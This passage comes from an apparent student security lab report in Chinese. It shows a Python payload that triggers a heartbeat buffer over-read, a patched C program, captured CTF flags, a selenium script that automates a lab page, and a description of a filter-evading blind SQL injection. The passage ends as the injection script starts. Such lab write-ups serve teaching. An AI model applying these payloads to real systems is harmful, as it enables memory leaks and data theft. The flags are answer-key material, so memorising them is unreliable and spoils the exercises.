<span class="normal"><a href="#__codelineno-12-6">6</a></span>
<span class="normal"><a href="#__codelineno-12-7">7</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-12-1" name="__codelineno-12-1"></a><span class="ch">#!/usr/bin/env python3</span>
<a id="__codelineno-12-2" name="__codelineno-12-2"></a><span class="c1">#&gt; This is pwn_lab0.py</span>
<a id="__codelineno-12-3" name="__codelineno-12-3"></a><span class="kn">import</span> <span class="nn">sys</span>
<a id="__codelineno-12-4" name="__codelineno-12-4"></a><span class="kn">import</span> <span class="nn">struct</span>
<a id="__codelineno-12-5" name="__codelineno-12-5"></a><span class="n">pkt</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s1">'&lt;IIII'</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">'</span><span class="se">\xFF</span><span class="s1">'</span> <span class="o">*</span> <span class="p">(</span><span class="mh">0x90</span><span class="p">)</span> <span class="c1">#0x90=size-16</span>
<a id="__codelineno-12-6" name="__codelineno-12-6"></a><span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">buffer</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">pkt</span><span class="p">[:</span><span class="mi">16</span><span class="p">])</span>
<a id="__codelineno-12-7" name="__codelineno-12-7"></a><span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">buffer</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">pkt</span><span class="p">[</span><span class="mi">16</span><span class="p">:])</span>
</code></pre></div></td></tr></table></div>
<p>然后执行<code>python3 pwn_lab0.py | ./program.elf</code>，可以得到一堆乱码输出。</p>
<h4 id="task3">Task3<a class="headerlink" href="#task3" title="Permanent link">¶</a></h4>
<p>（因为不知道是否可以提交<span class="heti-skip"><span class="heti-spacing"> </span>code.zip<span class="heti-spacing"> </span></span>所以把<span class="heti-skip"><span class="heti-spacing"> </span>nobug_program.c<span class="heti-spacing"> </span></span>贴到报告里好了）</p>
<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-13-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-13-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-13-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-13-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-13-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-13-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-13-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-13-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-13-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-13-10">10</a></span>
<span class="normal"><a href="#__codelineno-13-11">11</a></span>
<span class="normal"><a href="#__codelineno-13-12">12</a></span>
<span class="normal"><a href="#__codelineno-13-13">13</a></span>
<span class="normal"><a href="#__codelineno-13-14">14</a></span>
<span class="normal"><a href="#__codelineno-13-15">15</a></span>
<span class="normal"><a href="#__codelineno-13-16">16</a></span>
<span class="normal"><a href="#__codelineno-13-17">17</a></span>
<span class="normal"><a href="#__codelineno-13-18">18</a></span>
<span class="normal"><a href="#__codelineno-13-19">19</a></span>
<span class="normal"><a href="#__codelineno-13-20">20</a></span>
<span class="normal"><a href="#__codelineno-13-21">21</a></span>
<span class="normal"><a href="#__codelineno-13-22">22</a></span>
<span class="normal"><a href="#__codelineno-13-23">23</a></span>
<span class="normal"><a href="#__codelineno-13-24">24</a></span>
<span class="normal"><a href="#__codelineno-13-25">25</a></span>
<span class="normal"><a href="#__codelineno-13-26">26</a></span>
<span class="normal"><a href="#__codelineno-13-27">27</a></span>
<span class="normal"><a href="#__codelineno-13-28">28</a></span>
<span class="normal"><a href="#__codelineno-13-29">29</a></span>
<span class="normal"><a href="#__codelineno-13-30">30</a></span>
<span class="normal"><a href="#__codelineno-13-31">31</a></span>
<span class="normal"><a href="#__codelineno-13-32">32</a></span>
<span class="normal"><a href="#__codelineno-13-33">33</a></span>
<span class="normal"><a href="#__codelineno-13-34">34</a></span>
<span class="normal"><a href="#__codelineno-13-35">35</a></span>
<span class="normal"><a href="#__codelineno-13-36">36</a></span>
<span class="normal"><a href="#__codelineno-13-37">37</a></span>
<span class="normal"><a href="#__codelineno-13-38">38</a></span>
<span class="normal"><a href="#__codelineno-13-39">39</a></span>
<span class="normal"><a href="#__codelineno-13-40">40</a></span>
<span class="normal"><a href="#__codelineno-13-41">41</a></span>
<span class="normal"><a href="#__codelineno-13-42">42</a></span>
<span class="normal"><a href="#__codelineno-13-43">43</a></span>
<span class="normal"><a href="#__codelineno-13-44">44</a></span>
<span class="normal"><a href="#__codelineno-13-45">45</a></span>
<span class="normal"><a href="#__codelineno-13-46">46</a></span>
<span class="normal"><a href="#__codelineno-13-47">47</a></span>
<span class="normal"><a href="#__codelineno-13-48">48</a></span>
<span class="normal"><a href="#__codelineno-13-49">49</a></span>
<span class="normal"><a href="#__codelineno-13-50">50</a></span>
<span class="normal"><a href="#__codelineno-13-51">51</a></span>
<span class="normal"><a href="#__codelineno-13-52">52</a></span>
<span class="normal"><a href="#__codelineno-13-53">53</a></span>
<span class="normal"><a href="#__codelineno-13-54">54</a></span>
<span class="normal"><a href="#__codelineno-13-55">55</a></span>
<span class="normal"><a href="#__codelineno-13-56">56</a></span>
<span class="normal"><a href="#__codelineno-13-57">57</a></span>
<span class="normal"><a href="#__codelineno-13-58">58</a></span>
<span class="normal"><a href="#__codelineno-13-59">59</a></span>
<span class="normal"><a href="#__codelineno-13-60">60</a></span>
<span class="normal"><a href="#__codelineno-13-61">61</a></span>
<span class="normal"><a href="#__codelineno-13-62">62</a></span>
<span class="normal"><a href="#__codelineno-13-63">63</a></span>
<span class="normal"><a href="#__codelineno-13-64">64</a></span>
<span class="normal"><a href="#__codelineno-13-65">65</a></span>
<span class="normal"><a href="#__codelineno-13-66">66</a></span>
<span class="normal"><a href="#__codelineno-13-67">67</a></span>
<span class="normal"><a href="#__codelineno-13-68">68</a></span>
<span class="normal"><a href="#__codelineno-13-69">69</a></span>
<span class="normal"><a href="#__codelineno-13-70">70</a></span>
<span class="normal"><a href="#__codelineno-13-71">71</a></span>
<span class="normal"><a href="#__codelineno-13-72">72</a></span>
<span class="normal"><a href="#__codelineno-13-73">73</a></span>
<span class="normal"><a href="#__codelineno-13-74">74</a></span>
<span class="normal"><a href="#__codelineno-13-75">75</a></span>
<span class="normal"><a href="#__codelineno-13-76">76</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-13-1" name="__codelineno-13-1"></a><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span>
<a id="__codelineno-13-2" name="__codelineno-13-2"></a><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdlib.h&gt;</span>
<a id="__codelineno-13-3" name="__codelineno-13-3"></a><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;string.h&gt;</span>
<a id="__codelineno-13-4" name="__codelineno-13-4"></a><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdint.h&gt;</span>
<a id="__codelineno-13-5" name="__codelineno-13-5"></a><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdbool.h&gt;</span>
<a id="__codelineno-13-6" name="__codelineno-13-6"></a>
<a id="__codelineno-13-7" name="__codelineno-13-7"></a><span class="cp">#define MAX_PKT_SIZE 0x1000</span>
<a id="__codelineno-13-8" name="__codelineno-13-8"></a>
<a id="__codelineno-13-9" name="__codelineno-13-9"></a><span class="k">struct</span><span class="w"> </span><span class="nc">hbpkt</span>
<a id="__codelineno-13-10" name="__codelineno-13-10"></a><span class="p">{</span>
<a id="__codelineno-13-11" name="__codelineno-13-11"></a><span class="w">    </span><span class="kt">uint32_t</span><span class="w"> </span><span class="n">size</span><span class="p">;</span>
<a id="__codelineno-13-12" name="__codelineno-13-12"></a><span class="w">    </span><span class="kt">uint32_t</span><span class="w"> </span><span class="n">timestamp</span><span class="p">;</span>
<a id="__codelineno-13-13" name="__codelineno-13-13"></a><span class="w">    </span><span class="kt">uint32_t</span><span class="w"> </span><span class="n">index</span><span class="p">;</span>
<a id="__codelineno-13-14" name="__codelineno-13-14"></a><span class="w">    </span><span class="kt">uint32_t</span><span class="w"> </span><span class="n">cred</span><span class="p">;</span>
<a id="__codelineno-13-15" name="__codelineno-13-15"></a><span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="n">data</span><span class="p">[];</span>
<a id="__codelineno-13-16" name="__codelineno-13-16"></a><span class="p">};</span>
<a id="__codelineno-13-17" name="__codelineno-13-17"></a>
<a id="__codelineno-13-18" name="__codelineno-13-18"></a><span class="k">struct</span><span class="w"> </span><span class="nc">hbpkt</span><span class="w"> </span><span class="o">*</span><span class="n">get_heart_beat</span><span class="p">()</span>
<a id="__codelineno-13-19" name="__codelineno-13-19"></a><span class="p">{</span>
<a id="__codelineno-13-20" name="__codelineno-13-20"></a><span class="w">    </span><span class="kt">uint8_t</span><span class="w"> </span><span class="n">buffer</span><span class="p">[</span><span class="n">MAX_PKT_SIZE</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="mi">0</span><span class="p">};</span>
<a id="__codelineno-13-21" name="__codelineno-13-21"></a>
<a id="__codelineno-13-22" name="__codelineno-13-22"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">fread</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span><span class="w"> </span><span class="nc">hbpkt</span><span class="p">),</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="n">stdin</span><span class="p">)</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="mi">1</span><span class="p">)</span>
<a id="__codelineno-13-23" name="__codelineno-13-23"></a><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nb">NULL</span><span class="p">;</span>
<a id="__codelineno-13-24" name="__codelineno-13-24"></a>
<a id="__codelineno-13-25" name="__codelineno-13-25"></a><span class="w">    </span><span class="k">struct</span><span class="w"> </span><span class="nc">hbpkt</span><span class="w"> </span><span class="o">*</span><span class="n">tmp</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="k">struct</span><span class="w"> </span><span class="nc">hbpkt</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="n">buffer</span><span class="p">;</span>
<a id="__codelineno-13-26" name="__codelineno-13-26"></a>
<a id="__codelineno-13-27" name="__codelineno-13-27"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">tmp</span><span class="o">-&gt;</span><span class="n">size</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span><span class="w"> </span><span class="nc">hbpkt</span><span class="p">)</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="n">tmp</span><span class="o">-&gt;</span><span class="n">size</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">MAX_PKT_SIZE</span><span class="p">)</span>
<a id="__codelineno-13-28" name="__codelineno-13-28"></a><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nb">NULL</span><span class="p">;</span>
<a id="__codelineno-13-29" name="__codelineno-13-29"></a>
<a id="__codelineno-13-30" name="__codelineno-13-30"></a><span class="w">    </span><span class="kt">size_t</span><span class="w"> </span><span class="n">data_len</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">tmp</span><span class="o">-&gt;</span><span class="n">size</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span><span class="w"> </span><span class="nc">hbpkt</span><span class="p">);</span>
<a id="__codelineno-13-31" name="__codelineno-13-31"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">fread</span><span class="p">(</span><span class="n">tmp</span><span class="o">-&gt;</span><span class="n">data</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="n">data_len</span><span class="p">,</span><span class="w"> </span><span class="n">stdin</span><span class="p">)</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="n">data_len</span><span class="p">)</span>
<a id="__codelineno-13-32" name="__codelineno-13-32"></a><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nb">NULL</span><span class="p">;</span>
<a id="__codelineno-13-33" name="__codelineno-13-33"></a>
<a id="__codelineno-13-34" name="__codelineno-13-34"></a><span class="w">    </span><span class="k">struct</span><span class="w"> </span><span class="nc">hbpkt</span><span class="w"> </span><span class="o">*</span><span class="n">res</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">malloc</span><span class="p">(</span><span class="n">tmp</span><span class="o">-&gt;</span><span class="n">size</span><span class="p">);</span>
<a id="__codelineno-13-35" name="__codelineno-13-35"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">res</span><span class="p">)</span>
<a id="__codelineno-13-36" name="__codelineno-13-36"></a><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nb">NULL</span><span class="p">;</span>
<a id="__codelineno-13-37" name="__codelineno-13-37"></a>
<a id="__codelineno-13-38" name="__codelineno-13-38"></a><span class="w">    </span><span class="n">memcpy</span><span class="p">(</span><span class="n">res</span><span class="p">,</span><span class="w"> </span><span class="n">buffer</span><span class="p">,</span><span class="w"> </span><span class="n">tmp</span><span class="o">-&gt;</span><span class="n">size</span><span class="p">);</span>
<a id="__codelineno-13-39" name="__codelineno-13-39"></a>
<a id="__codelineno-13-40" name="__codelineno-13-40"></a><span class="w">    </span><span class="n">res</span><span class="o">-&gt;</span><span class="n">index</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span>
<a id="__codelineno-13-41" name="__codelineno-13-41"></a>
<a id="__codelineno-13-42" name="__codelineno-13-42"></a><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">res</span><span class="p">;</span>
<a id="__codelineno-13-43" name="__codelineno-13-43"></a><span class="p">}</span>
<a id="__codelineno-13-44" name="__codelineno-13-44"></a>
<a id="__codelineno-13-45" name="__codelineno-13-45"></a><span class="kt">int</span><span class="w"> </span><span class="n">reply_heart_beat</span><span class="p">(</span><span class="k">struct</span><span class="w"> </span><span class="nc">hbpkt</span><span class="w"> </span><span class="o">*</span><span class="n">pkt</span><span class="p">)</span>
<a id="__codelineno-13-46" name="__codelineno-13-46"></a><span class="p">{</span>
<a id="__codelineno-13-47" name="__codelineno-13-47"></a><span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">err</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="c1">// 这里给定初始化</span>
<a id="__codelineno-13-48" name="__codelineno-13-48"></a><span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">written</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
<a id="__codelineno-13-49" name="__codelineno-13-49"></a>
<a id="__codelineno-13-50" name="__codelineno-13-50"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">pkt</span><span class="o">-&gt;</span><span class="n">size</span><span class="p">)</span>
<a id="__codelineno-13-51" name="__codelineno-13-51"></a><span class="w">    </span><span class="p">{</span>
<a id="__codelineno-13-52" name="__codelineno-13-52"></a><span class="w">        </span><span class="n">written</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">fwrite</span><span class="p">(</span><span class="n">pkt</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="n">pkt</span><span class="o">-&gt;</span><span class="n">size</span><span class="p">,</span><span class="w"> </span><span class="n">stdout</span><span class="p">);</span>
<a id="__codelineno-13-53" name="__codelineno-13-53"></a><span class="w">        </span><span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
<a id="__codelineno-13-54" name="__codelineno-13-54"></a><span class="w">    </span><span class="p">}</span>
<a id="__codelineno-13-55" name="__codelineno-13-55"></a>
<a id="__codelineno-13-56" name="__codelineno-13-56"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">written</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="p">(</span><span class="kt">uint32_t</span><span class="p">)</span><span class="n">written</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="n">pkt</span><span class="o">-&gt;</span><span class="n">size</span><span class="p">)</span>
<a id="__codelineno-13-57" name="__codelineno-13-57"></a><span class="w">    </span><span class="p">{</span>
<a id="__codelineno-13-58" name="__codelineno-13-58"></a><span class="w">        </span><span class="n">err</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">-1</span><span class="p">;</span>
<a id="__codelineno-13-59" name="__codelineno-13-59"></a><span class="w">    </span><span class="p">}</span>
<a id="__codelineno-13-60" name="__codelineno-13-60"></a>
<a id="__codelineno-13-61" name="__codelineno-13-61"></a><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">err</span><span class="p">;</span>
<a id="__codelineno-13-62" name="__codelineno-13-62"></a><span class="p">}</span>
<a id="__codelineno-13-63" name="__codelineno-13-63"></a>
<a id="__codelineno-13-64" name="__codelineno-13-64"></a><span class="kt">int</span><span class="w"> </span><span class="n">main</span><span class="p">()</span><span class="w"> </span><span class="c1">// 无修改</span>
<a id="__codelineno-13-65" name="__codelineno-13-65"></a><span class="p">{</span>
<a id="__codelineno-13-66" name="__codelineno-13-66"></a><span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">err</span><span class="p">;</span>
<a id="__codelineno-13-67" name="__codelineno-13-67"></a><span class="w">    </span><span class="k">while</span><span class="w"> </span><span class="p">(</span><span class="nb">true</span><span class="p">)</span>
<a id="__codelineno-13-68" name="__codelineno-13-68"></a><span class="w">    </span><span class="p">{</span>
<a id="__codelineno-13-69" name="__codelineno-13-69"></a><span class="w">        </span><span class="k">struct</span><span class="w"> </span><span class="nc">hbpkt</span><span class="w"> </span><span class="o">*</span><span class="n">p</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">get_heart_beat</span><span class="p">();</span>
<a id="__codelineno-13-70" name="__codelineno-13-70"></a><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">p</span><span class="p">)</span>
<a id="__codelineno-13-71" name="__codelineno-13-71"></a><span class="w">            </span><span class="k">continue</span><span class="p">;</span>
<a id="__codelineno-13-72" name="__codelineno-13-72"></a>
<a id="__codelineno-13-73" name="__codelineno-13-73"></a><span class="w">        </span><span class="n">err</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">reply_heart_beat</span><span class="p">(</span><span class="n">p</span><span class="p">);</span>
<a id="__codelineno-13-74" name="__codelineno-13-74"></a><span class="w">        </span><span class="n">free</span><span class="p">(</span><span class="n">p</span><span class="p">);</span>
<a id="__codelineno-13-75" name="__codelineno-13-75"></a><span class="w">    </span><span class="p">}</span>
<a id="__codelineno-13-76" name="__codelineno-13-76"></a><span class="p">}</span>
</code></pre></div></td></tr></table></div>
<div style="page-break-after: always;"></div>
<h2 id="web">Web<a class="headerlink" href="#web" title="Permanent link">¶</a></h2>
<h4 id="challenge-1_3">Challenge 1<a class="headerlink" href="#challenge-1_3" title="Permanent link">¶</a></h4>
<p>flag: <code>flag{56297ad00e70449a16700a77bf24b071}</code></p>
<p>使用开发者工具（因为快捷键被禁了所以要在工具栏里手动打开<heti-adjacent class="heti-adjacent-half">）</heti-adjacent>，检查发现按钮<span class="heti-skip"><span class="heti-spacing"> </span>onfocus<span class="heti-spacing"> </span></span>有<span class="heti-skip"><span class="heti-spacing"> </span>hidden<span class="heti-spacing"> </span></span>属性，其<span class="heti-skip"><span class="heti-spacing"> </span>onclick<span class="heti-spacing"> </span></span>执行<span><span class="heti-spacing"> </span>函数getflag</span>()。尝试在控制台执行这个函数，<span>alert<span class="heti-spacing"> </span></span><span><span class="heti-spacing"> </span>提示1/13</span>37，然后再执行提示<span class="heti-skip"><span class="heti-spacing"> </span>token<span class="heti-spacing"> </span></span>错误。再尝试刷新重新<span><span class="heti-spacing"> </span>执行getflag</span>()，发现<span class="heti-skip"><span class="heti-spacing"> </span>alert<span class="heti-spacing"> </span></span><span><span class="heti-spacing"> </span>提示2/13</span>37，说明实际操作是<span><span class="heti-spacing"> </span>执行getflag</span>()、刷新<span><span class="heti-spacing"> </span>、再getflag</span>()。重复<span class="heti-skip"><span class="heti-spacing"> </span>1337<span class="heti-spacing"> </span></span>次（应该）能<span><span class="heti-spacing"> </span>拿到fl</span>ag。所以使用<span class="heti-skip"><span class="heti-spacing"> </span>python<span class="heti-spacing"> </span></span>的<span class="heti-skip"><span class="heti-spacing"> </span>selenium<span class="heti-spacing"> </span></span>库进行模拟操作执行。这里<span><span class="heti-spacing"> </span>需要GoogleDriv</span>er，操作方法就不赘述了。</p>
<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-14-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-14-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-14-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-14-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-14-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-14-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-14-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-14-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-14-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-14-10">10</a></span>
<span class="normal"><a href="#__codelineno-14-11">11</a></span>
<span class="normal"><a href="#__codelineno-14-12">12</a></span>
<span class="normal"><a href="#__codelineno-14-13">13</a></span>
<span class="normal"><a href="#__codelineno-14-14">14</a></span>
<span class="normal"><a href="#__codelineno-14-15">15</a></span>
<span class="normal"><a href="#__codelineno-14-16">16</a></span>
<span class="normal"><a href="#__codelineno-14-17">17</a></span>
<span class="normal"><a href="#__codelineno-14-18">18</a></span>
<span class="normal"><a href="#__codelineno-14-19">19</a></span>
<span class="normal"><a href="#__codelineno-14-20">20</a></span>
<span class="normal"><a href="#__codelineno-14-21">21</a></span>
<span class="normal"><a href="#__codelineno-14-22">22</a></span>
<span class="normal"><a href="#__codelineno-14-23">23</a></span>
<span class="normal"><a href="#__codelineno-14-24">24</a></span>
<span class="normal"><a href="#__codelineno-14-25">25</a></span>
<span class="normal"><a href="#__codelineno-14-26">26</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-14-1" name="__codelineno-14-1"></a><span class="kn">from</span> <span class="nn">selenium</span> <span class="kn">import</span> <span class="n">webdriver</span>
<a id="__codelineno-14-2" name="__codelineno-14-2"></a><span class="kn">from</span> <span class="nn">selenium.webdriver.chrome.service</span> <span class="kn">import</span> <span class="n">Service</span>
<a id="__codelineno-14-3" name="__codelineno-14-3"></a><span class="kn">from</span> <span class="nn">selenium.webdriver.common.by</span> <span class="kn">import</span> <span class="n">By</span>
<a id="__codelineno-14-4" name="__codelineno-14-4"></a><span class="kn">from</span> <span class="nn">selenium.webdriver.chrome.options</span> <span class="kn">import</span> <span class="n">Options</span>
<a id="__codelineno-14-5" name="__codelineno-14-5"></a><span class="kn">from</span> <span class="nn">selenium.common.exceptions</span> <span class="kn">import</span> <span class="n">NoAlertPresentException</span>
<a id="__codelineno-14-6" name="__codelineno-14-6"></a><span class="kn">import</span> <span class="nn">time</span>
<a id="__codelineno-14-7" name="__codelineno-14-7"></a><span class="n">chrome_options</span> <span class="o">=</span> <span class="n">Options</span><span class="p">()</span>
<a id="__codelineno-14-8" name="__codelineno-14-8"></a><span class="n">chrome_options</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s2">"--disable-infobars"</span><span class="p">)</span>
<a id="__codelineno-14-9" name="__codelineno-14-9"></a><span class="n">chrome_options</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s2">"--disable-notifications"</span><span class="p">)</span>
<a id="__codelineno-14-10" name="__codelineno-14-10"></a><span class="n">chrome_options</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s2">"--start-maximized"</span><span class="p">)</span>
<a id="__codelineno-14-11" name="__codelineno-14-11"></a><span class="n">service</span> <span class="o">=</span> <span class="n">Service</span><span class="p">()</span>
<a id="__codelineno-14-12" name="__codelineno-14-12"></a><span class="n">driver</span> <span class="o">=</span> <span class="n">webdriver</span><span class="o">.</span><span class="n">Chrome</span><span class="p">(</span><span class="n">service</span><span class="o">=</span><span class="n">service</span><span class="p">,</span> <span class="n">options</span><span class="o">=</span><span class="n">chrome_options</span><span class="p">)</span>
<a id="__codelineno-14-13" name="__codelineno-14-13"></a><span class="n">url</span> <span class="o">=</span> <span class="s2">"http://pumpk1n.com/lab0.php"</span>
<a id="__codelineno-14-14" name="__codelineno-14-14"></a><span class="k">try</span><span class="p">:</span>
<a id="__codelineno-14-15" name="__codelineno-14-15"></a>    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1338</span><span class="p">):</span>
<a id="__codelineno-14-16" name="__codelineno-14-16"></a>        <span class="n">driver</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
<a id="__codelineno-14-17" name="__codelineno-14-17"></a>        <span class="n">driver</span><span class="o">.</span><span class="n">execute_script</span><span class="p">(</span><span class="s2">"getflag()"</span><span class="p">)</span>
<a id="__codelineno-14-18" name="__codelineno-14-18"></a>        <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.2</span><span class="p">)</span>
<a id="__codelineno-14-19" name="__codelineno-14-19"></a>        <span class="k">try</span><span class="p">:</span>
<a id="__codelineno-14-20" name="__codelineno-14-20"></a>            <span class="n">alert</span> <span class="o">=</span> <span class="n">driver</span><span class="o">.</span><span class="n">switch_to</span><span class="o">.</span><span class="n">alert</span>
<a id="__codelineno-14-21" name="__codelineno-14-21"></a>            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">"</span><span class="si">{</span><span class="n">alert</span><span class="o">.</span><span class="n">text</span><span class="si">}</span><span class="s2">"</span><span class="p">)</span>
<a id="__codelineno-14-22" name="__codelineno-14-22"></a>            <span class="n">alert</span><span class="o">.</span><span class="n">accept</span><span class="p">()</span>
<a id="__codelineno-14-23" name="__codelineno-14-23"></a>        <span class="k">except</span> <span class="n">NoAlertPresentException</span><span class="p">:</span>
<a id="__codelineno-14-24" name="__codelineno-14-24"></a>            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">"No alert"</span><span class="p">)</span>
<a id="__codelineno-14-25" name="__codelineno-14-25"></a><span class="k">finally</span><span class="p">:</span>
<a id="__codelineno-14-26" name="__codelineno-14-26"></a>    <span class="k">pass</span>
</code></pre></div></td></tr></table></div>
<p>执行到最后<span class="heti-skip"><span class="heti-spacing"> </span>console<span class="heti-spacing"> </span></span>就会提示<span class="heti-skip"><span class="heti-spacing"> </span>flag<span class="heti-spacing"> </span></span>了。</p>
<h4 id="challenge-2_3">Challenge 2<a class="headerlink" href="#challenge-2_3" title="Permanent link">¶</a></h4>
<p>flag: flag{45541872-d892-4d7f-a2b1-da68f7597b1f}</p>
<p>首先测试发现输入<span class="heti-skip"><span class="heti-spacing"> </span>1<span class="heti-spacing"> </span></span>和<span class="heti-skip"><span class="heti-spacing"> </span>2<span class="heti-spacing"> </span></span>会返回两句不同的话，输入<span class="heti-skip"><span class="heti-spacing"> </span>3<span class="heti-spacing"> </span></span>以上就爆了，又说在<span class="heti-skip"><span class="heti-spacing"> </span>table=flag<span class="heti-spacing"> </span></span>和<span class="heti-skip"><span class="heti-spacing"> </span>column=flag<span class="heti-spacing"> </span></span>的地方，所以尝试<span><span class="heti-spacing"> </span>注入select flag from fl</span>ag，但是会被检测注入，尝试用<span class="heti-skip"><span class="heti-spacing"> </span>/**/<span class="heti-spacing"> </span></span>代替空格也不奏效，然后发现用<span class="heti-skip"><span class="heti-spacing"> </span>2|1<span class="heti-spacing"> </span></span>这样的语句会返回结果，所以考虑用<span class="heti-skip"><span class="heti-spacing"> </span>if<span class="heti-spacing"> </span></span>语句和纯函数注入，方法是检测输入的值和表值的<span class="heti-skip"><span class="heti-spacing"> </span>ascii<span class="heti-spacing"> </span></span>是不是相等，相等就<span><span class="heti-spacing"> </span>输</span>出1，不然就<span><span class="heti-spacing"> </span>输</span>出2，这样输出<span class="heti-skip"><span class="heti-spacing"> </span>1<span class="heti-spacing"> </span></span>就代表正确，输出<span class="heti-skip"><span class="heti-spacing"> </span>2<span class="heti-spacing"> </span></span>就代表不正确。为了减少遍历次数，使用二分搜索。</p>
<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-15-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-15-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-15-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-15-4"> 4</a></span>
